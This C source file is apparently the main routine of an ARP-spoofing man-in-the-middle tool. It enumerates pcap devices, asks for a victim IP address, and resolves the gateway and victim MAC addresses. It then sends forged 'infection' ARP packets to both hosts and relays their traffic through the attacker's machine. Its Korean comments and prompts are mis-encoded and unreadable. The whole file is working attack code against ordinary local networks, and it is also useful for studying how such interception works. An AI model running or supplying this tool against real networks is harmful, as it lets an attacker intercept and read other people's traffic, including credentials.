#include <stdio.h>
#include "getDeviceInfo.h"
#include "libnet.h"
#include "makeInfPacket.h"
#include "packetRelay.h"

int main()
{
	pcap_if_t *allDevice;
	pcap_if_t *viewDevice;
	pcap_t *handle = NULL;
	char errbuf[PCAP_ERRBUF_SIZE];
	int select;
	PIP_ADAPTER_INFO Device;

	int myIP[IPv4_ADDR_LEN];
	int gateIP[IPv4_ADDR_LEN];
	int victimIP[IPv4_ADDR_LEN];
	u_int8_t myMAC[ETHER_ADDR_LEN];
	u_int8_t gateMAC[ETHER_ADDR_LEN];
	u_int8_t victimMAC[ETHER_ADDR_LEN];

	UCHAR vicInfPacket[2048];
	UCHAR gateInfPacket[2048];

	//
	// device ���� ���
	//
	if ((pcap_findalldevs(&allDevice, errbuf)) == -1)
	{
		printf("��ġ�� �˻��ϴµ� ������ �߻��߽��ϴ�\n");
		printf("������ �������� ������� �ּ���.\n");
		return 0;
	}

	printf("���ͳ� ȯ���� ������ �ּ���(1.����, 2.����) : ");
	scanf("%d", &select);

	viewDevice = allDevice;
	for (int i = 1; i < select; i++)
		viewDevice = viewDevice->next;

	Device = getDeviceInfo();
	if (Device == NULL)
	{
		printf("Device ������ �о���µ� �����߽��ϴ�.\n");
		return -1;
	}


	//
	// device ����
	//
	handle = pcap_open_live(viewDevice->name, 65536, 1, 1000, errbuf);
	pcap_freealldevs(allDevice);


	//
	// my, gate, victim IP addr ���
	//
	printf("victim�� IP address (xxx.xxx.xxx.xxx): ");
	getIP(Device, myIP, gateIP);
	scanf("%d.%d.%d.%d", &victimIP[0], &victimIP[1], &victimIP[2], &victimIP[3]);
	

	//
	// my, gate, victim MAC addr ���
	//
	for (int i = 0; i < ETHER_ADDR_LEN; i++)
		myMAC[i] = Device->Address[i];
	printf("\nGateway Mac ������\n");
	getMAC(handle, myIP, myMAC, gateIP, gateMAC);
	printf("victim MAC ������\n");
	getMAC(handle, myIP, myMAC, victimIP, victimMAC);

	
	//
	// ������Ŷ �����
	//
	makeInfPacket(vicInfPacket, myMAC, victimMAC, gateIP, victimIP);
	makeInfPacket(gateInfPacket, myMAC, gateMAC, victimIP, gateIP);


	//
	// victim, gateway ������Ű��
	//
	sendInfPacket(handle, vicInfPacket, (sizeof(ETH_HDR) + sizeof(ARP_HDR)));
	sendInfPacket(handle, gateInfPacket, (sizeof(ETH_HDR) + sizeof(ARP_HDR)));
	
	//
	// ��Ŷ ������ ��Ű��
	//
	packetRelay(handle, myMAC, myIP, victimMAC, victimIP, gateMAC, gateIP);


	pcap_close(handle);

	return 0;
}